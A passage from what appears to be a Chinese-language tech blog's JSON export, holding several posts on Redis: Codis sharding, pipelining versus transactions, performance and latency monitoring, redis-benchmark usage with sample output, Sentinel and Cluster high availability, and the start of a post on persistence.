product name 进行组织； 目前仅提供了 Zookeeper、Etcd、Fs 三种实现，但是提供了抽象的 interface 可自行扩展； Codis-config 发起的命令都会通过 ZooKeeper 同步到各个存活的 Codis-proxy（Codis 依赖 ZooKeeper 来存放数据路由表和 Codis-proxy 节点的元信息）。 High Availability and Horizontal Scalability因为 Codis-proxy 是无状态的，可以比较容易的搭多个实例，达到高可用性和横向扩展。 对 Java 用户来说，可以使用基于 Jedis 的实现 Jodis ，来实现 proxy 层的 HA（如下图所示，本质上其实是访问Coordinator，如ZooKeeper）： 它会通过监控 zookeeper 上的注册信息来实时获得当前可用的 proxy 列表，既可以保证高可用性； 也可以通过轮流请求所有的proxy实现负载均衡。 Codis 的优点 轻松地实现高可用性和横向扩展 不停机的数据迁移（当增加 Redis server的数量时） 相对于twemproxy的优劣？codis和twemproxy最大的区别有两个：一个是codis支持动态水平扩展，对client完全透明不影响服务的情况下可以完成增减redis实例的操作；一个是codis是用go语言写的并支持多线程而twemproxy用C并只用单线程。 后者又意味着：codis在多核机器上的性能会好于twemproxy；codis的最坏响应时间可能会因为GC的STW而变大，不过go1.5发布后会显著降低STW的时间；如果只用一个CPU的话go语言的性能不如C，因此在一些短连接而非长连接的场景中，整个系统的瓶颈可能变成accept新tcp连接的速度，这时codis的性能可能会差于twemproxy。 相对于redis cluster的优劣？redis cluster基于smart client和无中心的设计，client必须按key的哈希将请求直接发送到对应的节点。这意味着：使用官方cluster必须要等对应语言的redis driver对cluster支持的开发和不断成熟；client不能直接像单机一样使用pipeline来提高效率，想同时执行多个请求来提速必须在client端自行实现异步逻辑。 而codis因其有中心节点、基于proxy的设计，对client来说可以像对单机redis一样去操作proxy（除了一些命令不支持），还可以继续使用pipeline并且如果后台redis有多个的话速度会显著快于单redis的pipeline。同时codis使用zookeeper来作为辅助，这意味着单纯对于redis集群来说需要额外的机器搭zk，不过对于很多已经在其他服务上用了zk的公司来说这不是问题：） Pre-shardingCodis 采用 Pre-sharding 的技术来实现数据的分片（sharding），默认分成 1024 个槽（slots） (0-1023)，对于每个key来说，通过以下公式确定所属的 Slot Id： 1SlotId = crc32(key) % 1024 每一个 slot 都会有一个且必须有一个特定的 server group id 来表示这个 slot 的数据由哪个 Codis-group（里面有且只有一个Codis-server master，可能还有一个或多个Codis-server slave） 来提供。数据的迁移也是以slot为单位的。 slot：分片信息，在redis当中仅仅表示一个数字，代表分片索引。每个分片会归属于具体的redis实例 group:主要是虚拟结点，由多台redis机器组成，形成一主多从的模式，是逻辑意义上的结点 Proxy 请求处理细节如下图所示：该部分主要涉及到proxy的处理细节，涉及到如何接受一个请求到响应回包的过程： 1）proxy接收客户端的连接之后，新建一个session,同时启动session中reader与writer两个协程，reader主要用于接收客户端请求数据并解析，对多key的场景下进行命令的拆分，然后将请求通过router进行分发到具体的redis实例，并将redis处理的数据结果写到通道到中，writer从通道中接收对应的结果，将写回给客户端。 Router层主要是通过crc命令得到key对应的路由信息，从源码可以看到hashtag的特性，codis其实也是支持的。 高可用&amp;容灾&amp;故障转移哨兵集群如何保证redis高可用 Sentinel（哨岗，哨兵）是Redis的高可用解决方案：由一个或多个Sentinel实例组成的Sentinel系统，可以监视任意多个主服务器，以及这些主服务器属下的所有的从服务器，并在被监视的主服务器进入下线状态时，自动将下线主服务器属下的某个从服务器升级为新的主服务器，然后由主服务器代替已下线的主服务器继续处理命令请求。 通常来说要达到服务的高可用的效果需要做2个事情：故障探测与故障转移（即选主并做主从切换）。 codis的架构本身分成proxy集群+redis集群，redis集群的高可用是由哨兵集群来保证的，那么proxy是如何感知redis主机故障，然后切换新主保证服务高可用的呢？ 如上图所示，proxy本身会监听sentinle集群的+switch-master事件，该事件发出，意味着redis集群主机出现问题，sentinel集群开始进行选举并切换主机，proxy监听了sentinel的主从切换事件，收到主从切换事件之后，proxy会做一个动作，就是把所有sentinel上的集群所感知的当前认为的主机拉取出来，选取过半sentinel认为的主机当作目前的集群主机。 Reference https://github.com/CodisLabs/Codis https://github.com/CodisLabs/Codis/blob/release3.2/doc/tutorial_zh.md https://www.cnblogs.com/chenny7/p/5063368.html https://my.oschina.net/u/658658/blog/500499 https://mp.weixin.qq.com/s/F68-e2umTQIq0aGfif58ow https://cloud.tencent.com/developer/article/1006262 https://github.com/CodisLabs/codis/blob/release3.2/doc/FAQ_zh.md","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"},{"name":"Codis","slug":"CacheSystem/Redis/Codis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/Codis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"},{"name":"Codis","slug":"Codis","permalink":"http://swsmile.info/tags/Codis/"}]},{"title":"【Redis】Redis pipeline","date":"2020-05-09T14:44:21.000Z","path":"2020/05/09/【Redis】Redis-pipeline/","text":"BackgroundRedis is a TCP server using the client-server model and what is called a Request/Response protocol. This means that usually a request is accomplished with the following steps: The client sends a query to the server, and reads from the socket, usually in a blocking way, for the server response. The server processes the command and sends the response back to the client. So for instance a four commands sequence is something like this: Client: INCR X Server: 1 Client: INCR X Server: 2 Client: INCR X Server: 3 Client: INCR X Server: 4 Clients and Servers are connected via a networking link. Such a link can be very fast (a loopback interface) or very slow (a connection established over the Internet with many hops between the two hosts). Whatever the network latency is, there is a time for the packets to travel from the client to the server, and back from the server to the client to carry the reply. This time is called RTT (Round Trip Time). It is very easy to see how this can affect the performances when a client needs to perform many requests in a row (for instance adding many elements to the same list, or populating a database with many keys). For instance if the RTT time is 250 milliseconds (in the case of a very slow link over the Internet), even if the server is able to process 100k requests per second, we’ll be able to process at max four requests per second. If the interface used is a loopback interface, the RTT is much shorter (for instance my host reports 0,044 milliseconds pinging 127.0.0.1), but it is still a lot if you need to perform many writes in a row. Fortunately there is a way to improve this use case. Redis PipeliningA Request/Response server can be implemented so that it is able to process new requests even if the client didn’t already read the old responses. This way it is possible to send multiple commands to the server without waiting for the replies at all, and finally read the replies in a single step. This is called pipelining, and is a technique widely in use since many decades. IMPORTANT NOTE: While the client sends commands using pipelining, the server will be forced to queue the replies, using memory. So if you need to send a lot of commands with pipelining, it is better to send them as batches having a reasonable number, for instance 10k commands, read the replies, and then send another 10k commands again, and so forth. The speed will be nearly the same, but the additional memory used will be at max the amount needed to queue the replies for these 10k commands. It’s not just a matter of RTTPipelining is not just a way in order to reduce the latency cost due to the round trip time, it actually improves by a huge amount the total operations you can perform per second in a given Redis server. This is the result of the fact that, without using pipelining, serving each command is very cheap from the point of view of accessing the data structures and producing the reply, but it is very costly from the point of view of doing the socket I/O. This involves calling the read() and write() syscall, that means going from user land to kernel land. The context switch is a huge speed penalty. When pipelining is used, many commands are usually read with a single read() system call, and multiple replies are delivered with a single write() system call. Because of this, the number of total queries performed per second initially increases almost linearly with longer pipelines, and eventually reaches 10 times the baseline obtained not using pipelining, as you can see from the following graph: Pipeline 和 Transaction 的区别 pipeline的执行会在 client 缓存（这意味着，在pipeline开始执行后，而执行 EXEC 之前，都不会有为了这次 pipeline 而进行的 TCP通信），而 Transaction 的执行会在 redis server缓存； 请求次数的不一致，multi需要每个命令都发送一次给服务端，pipeline最后一次性发送给服务端，请求次数相对于multi减少 multi/exec可以保证原子性，而pipeline不保证原子性 ExperimentPipeline12345p := client.Pipeline()p.SAdd(\"saddKey\", []string&#123;\"1\", \"2\", \"3\"&#125;)p.Set(\"cache1\", \"aabbcc\", 0)cmders, err := p.Exec() client 将待执行的命令写入到自己的缓冲区（client-buffer）中，最后当调用 EXEC 命令时，（通过 TCP 通讯）一次性发送给 redis server 以执行。 但是有一种情况是，client 缓冲区（client-buffer）的大小是有限制的（这当然与client 具体的实现也有关系），比如Jedis，限制为8192，超过了，则刷缓存，发送请求到Redis， Transaction123456789101112127.0.0.1:6379&gt; MULTIOK127.0.0.1:6379&gt; set aaabbbccc 123456QUEUED127.0.0.1:6379&gt; set cccbbbaaa 987654QUEUED127.0.0.1:6379&gt; get aaabbbcccQUEUED127.0.0.1:6379&gt; EXEC1) OK2) OK3) \"123456\" 我们总共执行了5条命令，每条命令都会有对应的TCP通讯（每次通讯都会附上这条命令对应的执行内容）： 这点其实是相比较 pipeline而言的，在 pipeline中，所有command都会缓存在 client，只有当执行 EXEC 命令时，才会进行TCP 通讯。 这也意味着，如果执行大量的 transaction，redis server的memory usage会上升（因为有大量未被执行的command 被缓存在 redis server的memory中）；而如果执行大量的 pipeline（而每个pipeline中执行命令数量不多或者这些命令对应执行后的结果的数据量并不大），这时候并不会消耗很多的redis server memory。 Reference https://redis.io/topics/pipelining","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis 性能分析 Insight","date":"2020-05-09T14:34:22.000Z","path":"2020/05/09/【Redis】Redis-性能分析/","text":"Factors impacting Redis performanceThere are multiple factors having direct consequences on Redis performance. We mention them here, since they can alter the result of any benchmarks. Please note however, that a typical Redis instance running on a low end, untuned box usually provides good enough performance for most applications. Network bandwidth and latency usually have a direct impact on the performance. It is a good practice to use the ping program to quickly check the latency between the client and server hosts is normal before launching the benchmark. Regarding the bandwidth, it is generally useful to estimate the throughput in Gbit/s and compare it to the theoretical bandwidth of the network. For instance a benchmark setting 4 KB strings in Redis at 100000 q/s, would actually consume 3.2 Gbit/s of bandwidth and probably fit within a 10 Gbit/s link, but not a 1 Gbit/s one. In many real world scenarios, Redis throughput is limited by the network well before being limited by the CPU. To consolidate several high-throughput Redis instances on a single server, it worth considering putting a 10 Gbit/s NIC or multiple 1 Gbit/s NICs with TCP/IP bonding. CPU is another very important factor. Being single-threaded, Redis favors fast CPUs with large caches and not many cores. At this game, Intel CPUs are currently the winners. It is not uncommon to get only half the performance on an AMD Opteron CPU compared to similar Nehalem EP/Westmere EP/Sandy Bridge Intel CPUs with Redis. When client and server run on the same box, the CPU is the limiting factor with redis-benchmark. Speed of RAM and memory bandwidth seem less critical for global performance especially for small objects. For large objects (&gt;10 KB), it may become noticeable though. Usually, it is not really cost-effective to buy expensive fast memory modules to optimize Redis. Redis runs slower on a VM compared to running without virtualization using the same hardware. If you have the chance to run Redis on a physical machine this is preferred. However this does not mean that Redis is slow in virtualized environments, the delivered performances are still very good and most of the serious performance issues you may incur in virtualized environments are due to over-provisioning, non-local disks with high latency, or old hypervisor software that have slow fork syscall implementation. When the server and client benchmark programs run on the same box, both the TCP/IP loopback and unix domain sockets can be used. Depending on the platform, unix domain sockets can achieve around 50% more throughput than the TCP/IP loopback (on Linux for instance). The default behavior of redis-benchmark is to use the TCP/IP loopback. The performance benefit of unix domain sockets compared to TCP/IP loopback tends to decrease when pipelining is heavily used (i.e. long pipelines). When an ethernet network is used to access Redis, aggregating commands using pipelining is especially efficient when the size of the data is kept under the ethernet packet size (about 1500 bytes). Actually, processing 10 bytes, 100 bytes, or 1000 bytes queries almost result in the same throughput. See the graph below. On multi CPU sockets servers, Redis performance becomes dependent on the NUMA configuration and process location. The most visible effect is that redis-benchmark results seem non-deterministic because client and server processes are distributed randomly on the cores. To get deterministic results, it is required to use process placement tools (on Linux: taskset or numactl). The most efficient combination is always to put the client and server on two different cores of the same CPU to benefit from the L3 cache. Here are some results of 4 KB SET benchmark for 3 server CPUs (AMD Istanbul, Intel Nehalem EX, and Intel Westmere) with different relative placements. Please note this benchmark is not meant to compare CPU models between themselves (CPUs exact model and frequency are therefore not disclosed). With high-end configurations, the number of client connections is also an important factor. Being based on epoll/kqueue, the Redis event loop is quite scalable. Redis has already been benchmarked at more than 60000 connections, and was still able to sustain 50000 q/s in these conditions. As a rule of thumb, an instance with 30000 connections can only process half the throughput achievable with 100 connections. Here is an example showing the throughput of a Redis instance per number of connections: Latency MonitoringWhat is high latency for one use case is not high latency for another. There are applications where all the queries must be served in less than 1 millisecond and applications where from time to time a small percentage of clients experiencing a 2 second latency is acceptable. So the first step to enable the latency monitor is to set a latency threshold in milliseconds. Only events that will take more than the specified threshold will be logged as latency spikes. The user should set the threshold according to their needs. For example if for the requirements of the application based on Redis the maximum acceptable latency is 100 milliseconds, the threshold should be set to such a value in order to log all the events blocking the server for a time equal or greater to 100 milliseconds. The latency monitor can easily be enabled at runtime in a production server with the following command: 1CONFIG SET latency-monitor-threshold 100 By default monitoring is disabled (threshold set to 0), even if the actual cost of latency monitoring is near zero. However while the memory requirements of latency monitoring are very small, there is no good reason to raise the baseline memory usage of a Redis instance that is working well. Information reporting with the LATENCY commandThe user interface to the latency monitoring subsystem is the LATENCY command. Like many other Redis commands, LATENCY accepts subcommands that modifies its behavior. These subcommands are: LATENCY LATEST - returns the latest latency samples for all events. LATENCY HISTORY - returns latency time series for a given event. LATENCY RESET - resets latency time series data for one or more events. LATENCY GRAPH - renders an ASCII-art graph of an event’s latency samples. LATENCY DOCTOR - replies with a human-readable latency analysis report. 1234567891011121314151617181920127.0.0.1:6379&gt; latency doctorDave, I have observed latency spikes in this Redis instance.You don&apos;t mind talking about it, do you Dave?1. command: 5 latency spikes (average 300ms, mean deviation 120ms, period 73.40 sec). Worst all time event 500ms.I have a few advices for you:- Your current Slow Log configuration only logs events that are slower than your configured latency monitor threshold. Please use &apos;CONFIG SET slowlog-log-slower-than 1000&apos;.- Check your Slow Log to understand what are the commands you are running which are too slow to execute. Please check http://redis.io/commands/slowlog for more information.- Deleting, expiring or evicting (because of maxmemory policy) large objects is a blocking operation. If you have very large objects that are often deleted, expired, or evicted, try to fragment those objects into multiple smaller objects. Redis slow log// TODO https://redis.io/commands/slowlog Measuring latencyIf you are experiencing latency problems, you probably know how to measure it in the context of your application, or maybe your latency problem is very evident even macroscopically. However redis-cli can be used to measure the latency of a Redis server in milliseconds, just try: 1$ redis-cli --latency -h `host` -p `port` Reference https://redis.io/topics/benchmarks https://redis.io/topics/latency-monitor https://redis.io/topics/problems https://redis.io/topics/latency https://redis.io/commands/slowlog","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis 性能测试（redis-benchmark）","date":"2020-05-09T03:54:18.000Z","path":"2020/05/09/【Redis】Redis-性能测试/","text":"redis-benchmarkRedis includes the redis-benchmark utility that simulates running commands done by N clients at the same time sending M total queries (it is similar to the Apache’s ab utility). Below you’ll find the full output of a benchmark executed against a Linux box. The following options are supported: 123456789101112131415161718192021222324Usage: redis-benchmark [-h &lt;host&gt;] [-p &lt;port&gt;] [-c &lt;clients&gt;] [-n &lt;requests]&gt; [-k &lt;boolean&gt;] -h &lt;hostname&gt; Server hostname (default 127.0.0.1) -p &lt;port&gt; Server port (default 6379) -s &lt;socket&gt; Server socket (overrides host and port) -a &lt;password&gt; Password for Redis Auth -c &lt;clients&gt; Number of parallel connections (default 50) -n &lt;requests&gt; Total number of requests (default 100000) -d &lt;size&gt; Data size of SET/GET value in bytes (default 2) --dbnum &lt;db&gt; SELECT the specified db number (default 0) -k &lt;boolean&gt; 1=keep alive 0=reconnect (default 1) -r &lt;keyspacelen&gt; Use random keys for SET/GET/INCR, random values for SADD Using this option the benchmark will expand the string __rand_int__ inside an argument with a 12 digits number in the specified range from 0 to keyspacelen-1. The substitution changes every time a command is executed. Default tests use this to hit random keys in the specified range. -P &lt;numreq&gt; Pipeline &lt;numreq&gt; requests. Default 1 (no pipeline). -q Quiet. Just show query/sec values --csv Output in CSV format -l Loop. Run the tests forever -t &lt;tests&gt; Only run the comma separated list of tests. The test names are the same as the ones produced as output. -I Idle mode. Just open N idle connections and wait. -n - 指定这次测试包括多少次 requests1$ redis-benchmark -q -n 100000 -q - 只基于每个command显示 performance （query/sec）123456789$ redis-benchmark -q -n 100000PING_INLINE: 124378.11 requests per secondPING_BULK: 124533.01 requests per secondSET: 125470.52 requests per secondGET: 126582.27 requests per secondINCR: 127064.80 requests per secondLPUSH: 114155.25 requests per secondRPUSH: 116959.06 requests per second... -t - 指定要测试的command set123$ redis-benchmark -t set,lpush -n 100000 -qSET: 74239.05 requests per secondLPUSH: 79239.30 requests per second In the above example we asked to just run test the SET and LPUSH commands, in quiet mode (see the -q switch). It is also possible to specify the command to benchmark directly like in the following example: 12$ redis-benchmark -n 100000 -q script load \"redis.call('set','foo','bar')\"script load redis.call('set','foo','bar'): 69881.20 requests per second -r - 指定 key 的数量By default the benchmark runs against a single key. In Redis the difference between such a synthetic benchmark and a real one is not huge since it is an in-memory system, however it is possible to stress cache misses and in general to simulate a more real-world work load by using a large key space. 理论上说，Redis是一个基于内存的缓存系统，所以一个 GET 操作理论上都是O(1)。而事实上，由于CPU L1、L2、L3的存在，仍然会有 cache miss出现。因此，当key的数量变多时，仍然有可能出现 query QPS降低的情况。 This is obtained by using the -r switch. For instance if I want to run one million SET operations, using a random key for every operation out of 100k possible keys, I’ll use the following command line: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354$ redis-benchmark flushallOK$ redis-benchmark -t set -r 1 -n 1000000====== SET ====== 1000000 requests completed in 7.94 seconds 50 parallel clients 3 bytes payload keep alive: 1100.00% &lt;= 1 milliseconds100.00% &lt;= 1 milliseconds125897.02 requests per second$ redis-benchmark flushallOK$ redis-benchmark -t set -r 10000 -n 1000000====== SET ====== 1000000 requests completed in 8.01 seconds 50 parallel clients 3 bytes payload keep alive: 1100.00% &lt;= 1 milliseconds100.00% &lt;= 1 milliseconds124828.37 requests per second$ redis-benchmark flushallOK$ redis-benchmark -t set -r 100000000 -n 1000000====== SET ====== 1000000 requests completed in 8.06 seconds 50 parallel clients 3 bytes payload keep alive: 199.92% &lt;= 1 milliseconds99.93% &lt;= 2 milliseconds100.00% &lt;= 3 milliseconds100.00% &lt;= 4 milliseconds100.00% &lt;= 4 milliseconds124007.94 requests per second$ redis-benchmark flushallOK$ redis-benchmark -t set -r 100000000000 -n 1000000====== SET ====== 1000000 requests completed in 8.10 seconds 50 parallel clients 3 bytes payload keep alive: 199.86% &lt;= 1 milliseconds99.88% &lt;= 2 milliseconds100.00% &lt;= 4 milliseconds100.00% &lt;= 5 milliseconds100.00% &lt;= 5 milliseconds123456.78 requests per second -Q - 使用pipeline1234567$ redis-benchmark -n 1000000 -t set,get -qSET: 123854.34 requests per secondGET: 122865.22 requests per second$ redis-benchmark -n 1000000 -t set,get -P 16 -qSET: 825082.50 requests per secondGET: 1063829.75 requests per second Using pipelining results in a significant increase in performance.","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis High-availability","date":"2020-05-07T09:16:56.000Z","path":"2020/05/07/【Redis】Redis-高可用/","text":"Redis集群当面对一个小型的Demo项目时，使用一台Redis服务器己经非常足够了，然而现实中的项目通常需要若干台Redis服务器的支持： 从结构上，单个Redis服务器会发生单点故障，同时一台服务器需要承受所有的请求负载。这就需要为数据生成多个副本并分配在不同的服务器上： 从容量上，单个Redis服务器的内存非常容易成为存储瓶颈，所以需要进行数据分片。 同时拥有多个Redis服务器后就会面临如何管理集群的问题，包括如何增加节点、故障恢复等操作。 为此，下文将依次详细介绍Redis中的数据分片（data sharding）、复制（replication）、哨兵（sentinel）和集群（cluster）的使用和原理。 数据分片（Data sharding）Background长期以来，Redis 本身仅支持单实例，内存一般最多 1020GB。这无法支撑大型线上业务系统的需求（比如当双11的时候，对于缓存容量的要求，往往会远高于平日）。而且也造成资源的利用率过低——毕竟现在服务器内存动辄 100200GB。 为解决单机承载能力不足和弹性设置容量的问题，我们就有了各种数据分片（data sharding）技术。 下面一一做介绍。 客户端分片（Client Sharding）传统的客户端分片这种方案将分片工作放在业务程序端，程序代码根据预先设置的路由规则（比如，对key hash然后按 10 取模，结果为1则存到 Redis node1，结果为2则存到Redis node2，以此类推），直接对多个 Redis 实例进行分布式访问。 Java redis客户端驱动 Jedis，支持Redis Sharding功能，即ShardedJedis以及结合缓存池的ShardedJedisPool。 这样的好处是，非常简单，服务端的Redis实例彼此独立，相互无关联，每个Redis实例像单服务器一样运行，非常容易线性扩展，系统的灵活性很强。因为其不依赖于第三方分布式中间件，实现方法和代码都自己掌控，可随时调整，不用担心踩到坑。 另外，这种分片机制的性能比代理式更好（少了一个中间分发环节）。 这实际上是一种静态分片技术。Redis 实例的增减，都得手工调整分片程序。 客户端sharding的劣势也是很明显的。由于sharding处理放到客户端，规模进一步扩大时给运维带来挑战。客户端sharding不支持动态增删节点。服务端Redis实例群拓扑结构有变化时，每个客户端都需要更新调整。连接不能共享，当应用规模增大时，资源浪费制约优化。 新一代的客户端分片Redis Cluster并非使用Porxy模式来连接集群节点，而是使用无中心节点的模式来组建集群（即没有coordinator）。 这意味着，client连接Redis Cluster时，Redis Cluster需要告诉client一个特定的key存在哪个Redis master node。 There are 16384 hash slots in Redis Cluster, and to compute what is the hash slot of a given key, we simply take the CRC16 of the key modulo 16384. 每个 key 存放在这 16384（0～16383） 个哈希槽中的其中一个，每个Redis node 存储一部分哈希槽。 代理分片（Proxy Sharding）这种方案，将分片工作交给专门的代理程序来做。代理程序接收到来自业务程序的数据请求，根据路由规则，将这些请求分发给正确的 Redis 实例并返回给业务程序。 这样的好处是，业务程序不用关心后端 Redis 实例，运维起来也方便。虽然会因此带来些性能损耗，但对于 Redis 这种内存读写型应用，相对而言是能容忍的。 这是我们推荐的集群实现方案。基于该机制的开源产品： Twemproxy、Codis。 复制（replication）通过持久化功能，Redis保证了即使在服务器重启的情况下也不会损失（或少量损失） 数据。但是由于数据是存储在一台服务器上的，如果这台服务器出现硬盘故障等问题，也会导致数据丢失。 为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。 为此， Redis提供了复制（replication）功能，可以实现当Master Redis node中的数据更新后（进行了写操作），自动将更新的数据同步到所有的Slave Redis node上。但不支持主主复制。 See https://redis.io/topics/replication for more details. 一致性保证（Consistency Guarantees）Synchronous replication of certain data can be requested by the clients using the WAIT command. However WAIT is only able to ensure that there are the specified number of acknowledged copies in the other Redis instances, it does not turn a set of Redis instances into a CP system with strong consistency: acknowledged writes can still be lost during a failover, depending on the exact configuration of the Redis persistence. However with WAIT the probability of losing a write after a failure event is greatly reduced to certain hard to trigger failure modes. Redis Cluster is not able to guarantee strong consistency. In practical terms this means that under certain conditions it is possible that Redis Cluster will lose writes that were acknowledged by the system to the client. The first reason why Redis Cluster can lose writes is because it uses asynchronous replication. This means that during writes the following happens: Your client writes to the master B. The master B replies OK to your client. The master B propagates the write to its slaves B1, B2 and B3. As you can see, B does not wait for an acknowledgement from B1, B2, B3 before replying to the client, since this would be a prohibitive latency penalty for Redis, so if your client writes something, B acknowledges the write, but crashes before being able to send the write to its slaves, one of the slaves (that did not receive the write) can be promoted to master, losing the write forever. See https://redis.io/topics/replication for more details. 优缺点优点 高可靠性：一方面，采用双机主备架构（master-slave architecture），能够在主库出现故障时自动进行主备切换，从库提升为主库提供服务，保证服务平稳运行；另一方面，开启数据持久化功能和配置合理的备份策略，能有效的解决数据误操作和数据异常丢失的问题； 读写分离策略：从节点可以扩展主库节点的读能力，有效应对大并发量的读操作。 缺点 故障恢复（failure recovery）复杂，如果没有 RedisHA 系统（需要开发），当 master Redis node 出现故障时，需要手动将一个 slave Redis node 晋升为master Redis node，同时需要通知业务方变更配置，整个过程需要人为干预，比较繁琐； 主库的写能力受到单机的限制，可以考虑数据分片（data sharding），即将数据基于一定的规则（比如CRC16）存储到多个Redis node中； 主库的存储能力受到单机的限制，同样可以考虑数据分片（data sharding）。 哨兵（Sentinel）- High AvailabilityBackground在一个典型的一主多从的Redis系统中， Slava Redis Node 在整个系统中起到了数据冗余备份和读写分离的作用。当 Master Redis Node 遇到异常中断服务后，运维人员可以通过手动的方式选择一个 Slava Redis Node 来升格为Master Redis Node ，以使得系统能够继续提供服务。 为此，Redis 2.8中提供了哨兵工具来实现自动化的系统监控和故障恢复功能。 顾名思义，哨兵的作用就是监控Redis系统的运行状况。它的功能包括： 监控Master Redis node和Slave Redis node是否正常运行， Master Redis node出现故障时自动将Slave Redis node转换为Master Redis node。 Redis SentinelRedis Sentinel provides high availability for Redis. In practical terms this means that using Sentinel you can create a Redis deployment that resists without human intervention certain kinds of failures. Redis Sentinel also provides other collateral tasks such as monitoring, notifications and acts as a configuration provider for clients. This is the full list of Sentinel capabilities at a macroscopical level (i.e. the big picture): Monitoring. Sentinel constantly checks if your master and replica instances are working as expected. Notification. Sentinel can notify the system administrator, or other computer programs, via an API, that something is wrong with one of the monitored Redis instances. Automatic failover. If a master is not working as expected, Sentinel can start a failover process where a replica is promoted to master, the other additional replicas are reconfigured to use the new master, and the applications using the Redis server are informed about the new address to use when connecting. Configuration provider. Sentinel acts as a source of authority for clients service discovery: clients connect to Sentinels in order to ask for the address of the current Redis master responsible for a given service. If a failover occurs, Sentinels will report the new address. See https://redis.io/topics/sentinel for more details. 哨兵是一个独立的进程，使用哨兵的一个典型架构如下图所示。 在一个一主多从的Redis系统中，可以使用多个哨兵进行监控任务以保证系统足够稳健， 如下图所示。注意，此时不仅哨兵会同时监控Master Redis node和Slave Redis node，哨兵之间也会互相监控。 优缺点优点 Redis Sentinel 集群部署简单； 能够解决 Redis 主从模式下的高可用切换问题； 很方便实现 Redis 数据节点的线形扩展，轻松突破 Redis 自身单线程瓶颈，可极大满足 Redis 大容量或高性能的业务需求； 可以实现一套 Sentinel 监控一组 Redis 数据节点或多组数据节点。 缺点 部署相对 Redis 主从模式要复杂一些，原理理解更繁琐； 资源浪费，Redis 数据节点中 slave 节点作为备份节点不提供服务； Redis Cluster（Redis 集群解决方案） - Redis 水平扩容即使使用哨兵，此时的Redis集群的每个数据库依然存有集群中的所有数据，从而导致集群的总数据存储量受限于可用存储内存最小的数据库节点，形成木桶效应。由于Redis 中的所有数据都是基于内存存储，这一问题就尤为突出了，尤其是当使用Redis做持久化存储服务使用时。 对Redis进行水平扩容（horizential scaling），在旧版Redis中通常使用客户端分片（client Sharding）来解决这个问题，即启动多个Redis数据库节点，由客户端决定每个 key 交由哪个 Redis node 存储，下次客户端读取该 key 时，直接到该节点读取即可。 这样可以实现将整个数据分布存储在N个Redis node 中，每个 node 只存放总数据量的1/N。 对于需要扩容的场景来说，在客户端分片后，如果想增加更多的节点（这是很有可能的，比如整个 Redis 集群的memory usage快满了，或者performance bottleneck），就需要对数据进行手工迁移，同时在迁移的过程中为了保证数据的一致性， 还需要将集群暂时下线，相对比较复杂。 Redis Cluster data shardingRedis Cluster does not use consistent hashing, but a different form of sharding where every key is conceptually part of what we call an hash slot. There are 16384 hash slots in Redis Cluster, and to compute what is the hash slot of a given key, we simply take the CRC16 of the key modulo 16384. Every node in a Redis Cluster is responsible for a subset of the hash slots, so for example you may have a cluster with 3 nodes, where: Node A contains hash slots from 0 to 5500. Node B contains hash slots from 5501 to 11000. Node C contains hash slots from 11001 to 16383. This allows to add and remove nodes in the cluster easily. For example if I want to add a new node D, I need to move some hash slot from nodes A, B, C to D. Similarly if I want to remove node A from the cluster I can just move the hash slots served by A to B and C. When the node A will be empty I can remove it from the cluster completely. Because moving hash slots from a node to another does not require to stop operations, adding and removing nodes, or changing the percentage of hash slots hold by nodes, does not require any downtime. Redis Cluster supports multiple key operations as long as all the keys involved into a single command execution (or whole transaction, or Lua script execution) all belong to the same hash slot. The user can force multiple keys to be part of the same hash slot by using a concept called hash tags. Hash tags are documented in the Redis Cluster specification, but the gist is that if there is a substring between {} brackets in a key, only what is inside the string is hashed, so for example this{foo}key and another{foo}key are guaranteed to be in the same hash slot, and can be used together in a command with multiple keys as arguments. See https://redis.io/topics/cluster-tutorial for more details. 总结哨兵与 Redis Cluster（Redis 集群解决方案） 没有太多的联系： 哨兵主要解决的是high-availability问题，即当一个 master Redis node挂了之后，我们需要一个自动化机制，使得 slave node自动取代 master Redis node（当然有一个前提，是我们配置了slave node），并成为一个新的 master node。 而 Redis Cluster 是一个Redis 集群解决方案，它主要为了解决水平扩容（horizential scaling）问题。 在 Redis Cluster 中，也为实现 high-availability 提供了 solution，即 failure failover，这个机制与哨兵机制稍有不同（当然他们都是为了实现 high-availability ）。 换言之，当不需要数据分片（虽然这个assumption往往是不正确的，因为我们怎么能保证在最开始建立一个系统时，我们就知道需要多少数据量，且在此之后我们的系统永远不会超过这个数据量），或者己经在客户端进行 sharding 的场景下，哨兵就足够使用了。 但如果需要进行水平扩容（horizential scaling）， 则 Redis Cluster 是一个非常好的选择。 Reference https://redis.io/topics/replication https://redis.io/topics/cluster-tutorial https://redis.io/topics/sentinel https://www.infoq.cn/article/effective-ops-part-03/?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis 持久化（Persistence）","date":"2020-05-07T09:15:32.000Z","path":"2020/05/07/【Redis】Redis-持久化/","text":"Redis的持久化机制（Persistence）Redis支持两种方式的持久化，一种是RDB方式，另一种是AOF（Append Only File）方式： 前者（RDB方式）会根据指定的规则“定时”将内存中的数据存储在硬盘上， 而后者（AOF（Append Only File）方式）在每次执行命令后将命令本身记录下来。 